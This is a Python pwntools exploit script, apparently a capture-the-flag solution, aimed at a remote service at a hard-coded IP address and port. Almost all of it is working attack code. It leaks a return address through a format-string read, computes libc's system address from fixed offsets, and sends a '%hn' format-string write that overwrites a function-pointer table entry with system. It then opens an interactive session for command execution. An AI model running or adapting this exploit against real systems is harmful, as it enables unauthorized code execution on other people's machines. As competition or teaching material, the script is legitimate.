#!/usr/bin/python

from pwn import *

DEBUG = False

p = remote("78.46.224.86", 1337)

ret_offset = 0x203f1
system_offset = 0x456d0

#target = 0x4004e4
target = 0x601018

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def leak(text):
  p.sendline(text)

  return r("haha")

main_ret = int(leak("%38$p haha")[:-5], 16)
system_addr = main_ret - ret_offset + system_offset

print "main_ret: 0x%x" % main_ret
print "system_addr: 0x%x" % system_addr

addr1 = system_addr % 0x10000
addr2 = (system_addr >> 16) % 0x10000

print "overwrite1: 0x%x" % addr1
print "overwrite2: 0x%x" % addr2

payload = ""
payload += "%" + str(addr1) + "d"
payload += "%10$hn"

payload += "%" + str(0x10000 + addr2 - addr1) + "d"
payload += "%11$hn"

payload = payload.ljust(0x20, " ")
payload += p64(target)
payload += p64(target + 2)

print "payload: %s" % payload

p.sendline(payload)

"""
code = p.recvuntil("check")[:-6]

print len(code)

concat = ""

for c in code:
  concat += c.encode("hex") + " "
print concat
"""

p.interactive()

p.close()
